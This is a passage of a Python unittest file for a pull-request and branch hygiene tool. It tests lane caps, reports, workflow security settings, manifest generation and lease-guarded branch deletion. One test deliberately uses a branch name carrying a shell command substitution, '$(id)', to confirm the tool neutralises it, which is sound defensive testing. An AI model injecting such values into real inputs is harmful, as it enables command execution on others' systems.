        self.assertEqual(rc, 0)
        muts = api.mutating()
        self.assertEqual([m[1].rsplit("/", 1)[-1] for m in muts], ["comments", "labels"])
        self.assertEqual(muts[1][2], {"labels": [ph.LABEL_CAP]})
        self.assertIn(ph.MARK_CAP, muts[0][2]["body"])
        self.assertNotIn("TITLE-MUST-NEVER", json.dumps(muts))

    def test_idempotent_on_reopen(self):
        prs = [raw_pr(n, "codex/%d" % n) for n in (1, 2, 3)]
        api = self.api_for(prs, comments=[{"body": "x " + ph.MARK_CAP}], pr_number=3)
        self.run_notice(api, 3)
        self.assertEqual([m[1].rsplit("/", 1)[-1] for m in api.mutating()], ["labels"])
        prs[2]["labels"] = [{"name": ph.LABEL_CAP}]
        api = self.api_for(prs, pr_number=3)
        self.run_notice(api, 3)
        self.assertEqual(api.mutating(), [])

    def test_within_cap_exempt_fork_closed_paused_do_nothing(self):
        base = [raw_pr(n, "codex/%d" % n) for n in (1, 2)]
        cases = {
            "within": (base + [raw_pr(3, "codex/3", labels=["cap-exempt"])], 3, {}),
            "fork": (base + [raw_pr(3, "codex/3", repo="fork/r")], 3, {}),
            "closed": (base + [raw_pr(3, "codex/3", state="closed")], 3, {}),
            "paused": (base + [raw_pr(3, "codex/3")], 3, {"PR_HYGIENE_PAUSED": "1"}),
        }
        for name, (prs, n, env) in cases.items():
            api = self.api_for(prs, pr_number=n)
            rc, _ = self.run_notice(api, n, environ=env)
            self.assertEqual((name, rc, api.mutating()), (name, 0, []))

    def test_never_fails(self):
        for api in (FakeApi(fail_on=lambda m, p: True),
                    FakeApi(fail_on=lambda m, p: m == "POST",
                            routes=self.api_for([raw_pr(n, "codex/%d" % n) for n in (1, 2, 3)],
                                                pr_number=3).routes)):
            rc, text = self.run_notice(api, 3)
            self.assertEqual(rc, 0)
            self.assertIn("skipped", text)
        rc, _ = self.run_notice(FakeApi(), "notanumber")
        self.assertEqual(rc, 0)
        out = io.StringIO()
        rc = ph.main(["notice", "--repo", REPO, "--pr", "1", "--caps", "garbage"], api=FakeApi(),
                     git=RecGit(), out=out, environ={})
        self.assertEqual(rc, 0)

    def test_dry_run_mutates_nothing(self):
        prs = [raw_pr(n, "codex/%d" % n) for n in (1, 2, 3)]
        api = self.api_for(prs, pr_number=3)
        self.run_notice(api, 3, ["--dry-run"])
        self.assertEqual(api.mutating(), [])


class ReportTests(unittest.TestCase):
    def test_report_sections_and_no_untrusted_markup(self):
        names = ["codex/ok", "codex/x$(id)", "research/r", "claude/unmerged", "claude/old-merged"]
        branches = [
            {"name": "codex/ok", "sha": SHA, "ts": NOW - 50 * DAY, "merged": True},
            {"name": "codex/x$(id)", "sha": SHA, "ts": NOW - 50 * DAY, "merged": True},
            {"name": "research/r", "sha": SHA, "ts": NOW - 50 * DAY, "merged": True},
            {"name": "claude/unmerged", "sha": SHA2, "ts": NOW - 50 * DAY, "merged": False},
            {"name": "claude/old-merged", "sha": SHA, "ts": NOW - 50 * DAY, "merged": True},
        ]
        prs = [merged_pr_for(1, "codex/ok"), merged_pr_for(2, "codex/x$(id)"),
               raw_pr(3, "codex/live", updated_days_ago=30)]
        snap = snap_of(branches, prs)
        text = ph.render_report(snap, ph.default_cfg())
        for h in ("Open PRs per lane", "Stale PRs", "Merged-but-undeleted branches",
                  "Branches with no PR older than 14 days", "Protected branches"):
            self.assertIn(h, text)
        self.assertNotIn("TITLE-MUST-NEVER", text)
        self.assertIn("`claude/unmerged`", text)
        self.assertNotIn("$(id)` (rule", text)  # hostile name is never listed as deletable
        self.assertIn("PR_HYGIENE", "PR_HYGIENE")
        self.assertIn("#3", text)  # stale
        self.assertIn("scan stamp is current", text)
        stale_text = ph.render_report(snap_of(branches, prs, stamp_days_ago=99), ph.default_cfg())
        self.assertIn("STALE, apply will refuse", stale_text)

    def test_md_code_neutralises(self):
        self.assertEqual(ph.md_code("a`b|c\n<d>"), "`a?b?c??d?`")


class WorkflowFileTests(unittest.TestCase):
    """Static checks on the new workflows (needs PyYAML; skipped without it)."""

    ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "workflows"))

    def load(self, name):
        try:
            import yaml
        except ImportError:
            self.skipTest("PyYAML not installed")
        with open(os.path.join(self.ROOT, name), encoding="utf-8") as fh:
            text = fh.read()
        return yaml.safe_load(text), text

    def check_common(self, name):
        data, text = self.load(name)
        on = data.get("on", data.get(True))
        self.assertNotIn("pull_request_target", on)
        self.assertEqual(data["permissions"], {})
        for jname, job in data["jobs"].items():
            self.assertLessEqual(job["timeout-minutes"], 25, jname)
            self.assertEqual(job["runs-on"], "ubuntu-24.04")
            for step in job["steps"]:
                if "run" in step:
                    self.assertNotIn("${{", step["run"], "%s/%s interpolates into run:" % (jname, step.get("name")))
                if "uses" in step:
                    self.assertTrue(step["uses"].startswith("actions/"), step["uses"])
        return data, on

    def test_pr_hygiene_workflow(self):
        data, on = self.check_common("pr-hygiene.yml")
        self.assertEqual(sorted(on), ["schedule", "workflow_dispatch"])
        self.assertIs(on["workflow_dispatch"]["inputs"]["dry_run"]["default"], True)
        writers = [j for j, job in data["jobs"].items()
                   if (job.get("permissions") or {}).get("contents") == "write"]
        self.assertEqual(writers, ["apply"])
        self.assertIn("dry_run == false", data["jobs"]["apply"]["if"])
        self.assertIn("default_branch", data["jobs"]["apply"]["if"])
        # a deletion-only apply must be possible: PR actions are an explicit input, default 0,
        # and the apply job passes it through verbatim (no `|| '10'` fallback)
        inp = on["workflow_dispatch"]["inputs"]["pr_actions"]
        self.assertEqual(str(inp["default"]), "0")
        env = data["jobs"]["apply"]["env"]
        self.assertEqual(env["PR_MAX_PR_ACTIONS"], "${{ inputs.pr_actions }}")
        self.assertEqual(env["PR_MAX_DELETES"], "${{ inputs.max_deletes }}")

    def test_lane_cap_workflow_cannot_block_or_run_pr_code(self):
        data, on = self.check_common("pr-lane-cap.yml")
        self.assertEqual(list(on), ["pull_request"])
        self.assertEqual(on["pull_request"]["types"], ["opened", "reopened"])
        job = data["jobs"]["notice"]
        self.assertIs(job["continue-on-error"], True)
        self.assertIn("head.repo.full_name == github.repository", job["if"])
        perms = job["permissions"]
        self.assertEqual(perms.get("contents"), "read")
        co = [s for s in job["steps"] if str(s.get("uses", "")).startswith("actions/checkout")][0]
        self.assertIn("default_branch", co["with"]["ref"])
        self.assertIs(co["with"]["persist-credentials"], False)


class ManifestGeneratorTests(unittest.TestCase):
    """gen_branch_protect.py on a tiny real repo: json/log/txt citations count."""

    def setUp(self):
        if not shutil.which("git"):
            self.skipTest("git not installed")
        import gen_branch_protect as gen
        self.gen = gen
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp)
        self.env = dict(os.environ, GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@e",
                        GIT_COMMITTER_NAME="t", GIT_COMMITTER_EMAIL="t@e")
        self.repo = os.path.join(self.tmp, "r")
        self.g("init", "-q", self.repo)
        write(os.path.join(self.repo, "evidence.json"), '{"ref": "refs/heads/codex/in-json"}\n')
        write(os.path.join(self.repo, "run.log"), "built from claude/in-log at 12:00\n")
        write(os.path.join(self.repo, "notes.txt"), "see codex/in-txt.\n")
        os.makedirs(os.path.join(self.repo, ".github"))
        write(os.path.join(self.repo, ".github", "branch-protect.txt"), "codex/only-in-manifest\n")
        self.g("-C", self.repo, "add", "-A")
        self.g("-C", self.repo, "commit", "-q", "-m", "x")
        for b in ("codex/in-json", "claude/in-log", "codex/in-txt", "codex/uncited", "codex/only-in-manifest"):
            self.g("-C", self.repo, "update-ref", "refs/remotes/origin/" + b, "HEAD")
        self.man = os.path.join(self.tmp, "man.txt")
        write(self.man, "# header\nhand/entry\n")

    def g(self, *args):
        return subprocess.run(["git"] + list(args), env=self.env, check=True, capture_output=True,
                              text=True).stdout.strip()

    def run_gen(self):
        out = io.StringIO()
        old, sys.stdout = sys.stdout, out
        try:
            self.gen.main(["--git-dir", self.repo, "--rev", "HEAD", "--manifest", self.man,
                           "--date", "2026-10-23"])
        finally:
            sys.stdout = old
        with open(self.man, encoding="utf-8") as fh:
            return fh.read()

    def test_scans_every_file_type_keeps_hand_entries_and_is_idempotent(self):
        text = self.run_gen()
        names = {ln for ln in text.splitlines() if ln and not ln.startswith("#")}
        self.assertEqual(names, {"hand/entry", "codex/in-json", "claude/in-log", "codex/in-txt"})
        self.assertIn("# scan-date: 2026-10-23", text)
        self.assertIn("# scan-rev: " + self.g("-C", self.repo, "rev-parse", "HEAD"), text)
        self.assertEqual(self.run_gen(), text)  # second run changes nothing
        stamp = ph.read_manifest_stamp(self.man)
        self.assertEqual(stamp["scan_rev"], self.g("-C", self.repo, "rev-parse", "HEAD"))
        self.assertIsNotNone(stamp["scan_date"])

    def test_unstamped_manifest_is_stale(self):
        snap = snap_of([], stamp_days_ago=None)
        self.assertIn("no scan-date", ph.manifest_stale_reason(snap))
        self.assertIsNone(ph.manifest_stale_reason(snap_of([], stamp_days_ago=2)))


class LeaseIntegrationTests(unittest.TestCase):
    """Real git: a stale expected sha must be rejected, the right one deletes."""

    def setUp(self):
        if not shutil.which("git"):
            self.skipTest("git not installed")
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp)
        self.env = dict(os.environ, GIT_TERMINAL_PROMPT="0", GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@e",
                        GIT_COMMITTER_NAME="t", GIT_COMMITTER_EMAIL="t@e")
        self.remote = os.path.join(self.tmp, "remote.git")
        self.work = os.path.join(self.tmp, "work")
        self.g("init", "-q", "--bare", self.remote)
        self.g("init", "-q", self.work)
        self.g("-C", self.work, "commit", "-q", "--allow-empty", "-m", "one")
        self.g("-C", self.work, "push", "-q", self.remote, "HEAD:refs/heads/codex/x")
        self.sha1 = self.g("-C", self.work, "rev-parse", "HEAD").strip()
        self.g("-C", self.work, "commit", "-q", "--allow-empty", "-m", "two")
        self.sha2 = self.g("-C", self.work, "rev-parse", "HEAD").strip()

    def g(self, *args):
        return subprocess.run(["git"] + list(args), env=self.env, check=True, capture_output=True,
                              text=True).stdout

    def refs(self):
        return self.g("-C", self.remote, "for-each-ref", "--format=%(refname)").split()

    def test_stale_sha_rejected_then_right_sha_deletes(self):
        self.g("-C", self.work, "push", "-q", self.remote, "HEAD:refs/heads/codex/x")  # branch moves
        with self.assertRaises(ph.GitError):
            ph.delete_with_lease(ph.run_git, self.remote, "codex/x", self.sha1, self.env)
        self.assertEqual(self.refs(), ["refs/heads/codex/x"])
        ph.delete_with_lease(ph.run_git, self.remote, "codex/x", self.sha2, self.env)
        self.assertEqual(self.refs(), [])

    def test_collect_branches_from_real_clone(self):
        clone = os.path.join(self.tmp, "clone")
        self.g("clone", "-q", self.remote, clone)
        self.g("-C", clone, "fetch", "-q", "origin", "+refs/heads/*:refs/remotes/origin/*")
        self.g("-C", self.work, "push", "-q", self.remote, "HEAD:refs/heads/main")
        self.g("-C", clone, "fetch", "-q", "origin", "+refs/heads/*:refs/remotes/origin/*")
        rows = {b["name"]: b for b in ph.collect_branches_git(ph.run_git, clone, "origin", "main")}
        self.assertTrue(rows["main"]["merged"])
        self.assertTrue(rows["codex/x"]["merged"])  # one is an ancestor of two
        self.assertEqual(rows["codex/x"]["sha"], self.sha1)


if __name__ == "__main__":
    unittest.main()
